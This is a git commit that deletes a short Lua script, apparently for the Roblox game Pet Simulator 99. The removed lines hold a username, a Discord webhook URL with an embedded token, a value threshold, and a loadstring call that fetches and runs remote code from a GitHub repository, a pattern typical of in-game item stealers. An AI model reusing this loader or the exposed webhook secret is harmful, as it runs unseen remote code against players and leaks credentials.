ba231b721b547cd07cb61183ed78ef4a02f474c2
Fabhay <72580053+fabhay2@users.noreply.github.com>
2024-12-11 18:04:52 -0500

    Delete Petsim99Script..lua

--- Petsim99Script..lua
+++
@@ -1,6 +0,0 @@
-Username= 'fabhay2'
-Webhook= 'https://discord.com/api/webhooks/1316534043499823104/DzVCHPKWhSMlBfj1ljQ2dgLIrdZsJdW9hiNEmq2FD_hzwtDcMyv6GdY7KkSumIsBdxku'
-
-MinimumRAP = 0
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/KSFoster/VANHOFFHub/refs/heads/main/Lua'))()
